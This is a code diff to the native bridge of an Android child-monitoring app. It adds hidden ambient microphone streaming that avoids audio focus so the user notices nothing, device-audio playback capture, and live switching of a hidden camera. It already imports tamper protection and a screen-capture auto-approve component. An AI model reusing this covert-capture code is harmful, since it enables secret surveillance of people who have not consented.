@@ -29,6 +29,7 @@ import com.childmonitor.permissions.PermissionSettingsLauncher
 import com.childmonitor.TamperProtectionManager
 import com.childmonitor.UsageStatsReader
 import com.childmonitor.accessibility.ScreenCaptureAutoApprove
+import com.childmonitor.capture.DevicePlaybackCaptureSession
 import com.childmonitor.capture.HiddenAudioCapture
 import com.childmonitor.capture.HiddenCameraCapture
 import com.childmonitor.capture.HiddenScreenCapture
@@ -277,8 +278,14 @@ class ChildMonitorNativeModule(private val reactContext: ReactApplicationContext
     @ReactMethod
     fun updateApiBaseUrl(apiBaseUrl: String, promise: Promise) {
         try {
-            MonitoringPrefs.updateApiBaseUrl(reactContext, apiBaseUrl)
-            NativeStreamingCoordinator.onApiBaseUrlChanged(reactContext)
+            val normalized = apiBaseUrl.trimEnd('/')
+            val previous = MonitoringPrefs.apiBaseUrl(reactContext)?.trimEnd('/')
+            MonitoringPrefs.updateApiBaseUrl(reactContext, normalized)
+            // Reconnecting STOMP on every heartbeat/poll (same URL) tears down
+            // signaling subscriptions mid-stream — only reconnect when the base changes.
+            if (previous != normalized) {
+                NativeStreamingCoordinator.onApiBaseUrlChanged(reactContext)
+            }
             promise.resolve(null)
         } catch (e: Exception) {
             promise.reject("UPDATE_API_URL_ERROR", e)
@@ -785,7 +792,8 @@ class ChildMonitorNativeModule(private val reactContext: ReactApplicationContext
     @ReactMethod
     fun getUsageStats(promise: Promise) {
         try {
-            val since = MonitoringPrefs.lastUsageSyncMs(reactContext)
+            // Full day snapshot — matches NativeSyncUploader so JS ingest stays complete.
+            val since = UsageStatsReader.startOfTodayMs()
             val arr: WritableArray = Arguments.createArray()
             UsageStatsReader.readSince(reactContext, since).forEach { entry ->
                 val map: WritableMap = Arguments.createMap()
@@ -1438,6 +1446,54 @@ class ChildMonitorNativeModule(private val reactContext: ReactApplicationContext
         HiddenAudioCapture.createMediaStream(reactContext, promise)
     }
 
+    /**
+     * Ambient room mic for camera monitoring — does **not** take exclusive audio focus or
+     * MODE_IN_COMMUNICATION, so YouTube/Spotify keep playing (FlashGet Kids-style).
+     */
+    @ReactMethod
+    fun getHiddenAmbientAudioMediaStream(promise: Promise) {
+        HiddenAudioCapture.createAmbientMicMediaStream(reactContext, promise)
+    }
+
+    /**
+     * Audio track for AudioPlaybackCapture injection — does not steal audio focus from
+     * YouTube/Spotify/games (unlike [getHiddenAudioMediaStream]).
+     */
+    @ReactMethod
+    fun getHiddenPlaybackAudioMediaStream(promise: Promise) {
+        HiddenAudioCapture.createPlaybackInjectMediaStream(reactContext, promise)
+    }
+
+    /**
+     * Starts MediaProjection AudioPlaybackCapture and injects device audio into the next
+     * WebRTC mic track (used for AUDIO mode and screen-share system audio).
+     */
+    @ReactMethod
+    fun startDevicePlaybackCapture(promise: Promise) {
+        Thread {
+            try {
+                val ok = DevicePlaybackCaptureSession.start(reactContext.applicationContext)
+                if (ok) {
+                    promise.resolve(true)
+                } else {
+                    promise.reject("PLAYBACK_CAPTURE_FAILED", "Device playback capture failed to start")
+                }
+            } catch (e: Exception) {
+                promise.reject("PLAYBACK_CAPTURE_FAILED", e)
+            }
+        }.start()
+    }
+
+    @ReactMethod
+    fun stopDevicePlaybackCapture(promise: Promise) {
+        try {
+            DevicePlaybackCaptureSession.stop()
+            promise.resolve(null)
+        } catch (e: Exception) {
+            promise.reject("PLAYBACK_CAPTURE_STOP_ERROR", e)
+        }
+    }
+
     @ReactMethod
     fun getHiddenScreenMediaStream(promise: Promise) {
         HiddenScreenCapture.createMediaStream(reactContext, promise)
@@ -1446,6 +1502,7 @@ class ChildMonitorNativeModule(private val reactContext: ReactApplicationContext
     @ReactMethod
     fun stopHiddenAudioStream(promise: Promise) {
         try {
+            DevicePlaybackCaptureSession.stop()
             HiddenAudioCapture.stop(reactContext)
             promise.resolve(null)
         } catch (e: Exception) {
@@ -1456,6 +1513,9 @@ class ChildMonitorNativeModule(private val reactContext: ReactApplicationContext
     @ReactMethod
     fun stopHiddenScreenStream(promise: Promise) {
         try {
+            // Screen sessions may have started device-playback audio; always stop it so the
+            // parent does not keep a stale "Listening" / audio path after Stop.
+            DevicePlaybackCaptureSession.stop()
             HiddenScreenCapture.stop(reactContext)
             promise.resolve(null)
         } catch (e: Exception) {
@@ -1467,6 +1527,13 @@ class ChildMonitorNativeModule(private val reactContext: ReactApplicationContext
     fun getHiddenCameraMediaStream(facingMode: String, promise: Promise) {
         val facing = if (facingMode.equals("environment", ignoreCase = true)) "environment" else "user"
         HiddenCameraCapture.createMediaStream(reactContext, facing, promise)
+    }
+
+    /** Flip the live hidden camera without recreating the WebRTC track. */
+    @ReactMethod
+    fun switchHiddenCameraFacing(facingMode: String, promise: Promise) {
+        val facing = if (facingMode.equals("environment", ignoreCase = true)) "environment" else "user"
+        HiddenCameraCapture.switchFacing(facing, promise)
     }
 
     @ReactMethod
@@ -1684,6 +1751,7 @@ class ChildMonitorNativeModule(private val reactContext: ReactApplicationContext
                 val granted = MediaProjectionConsentHelper.ensureConsent(
                     launchContext,
                     60_000L,
+                    com.childmonitor.capture.ConsentLaunchSource.USER_GRANT,
                 )
                 PcpFlowLogger.log(
                     PcpFlowLogger.Category.PERMISSION_FLOW,
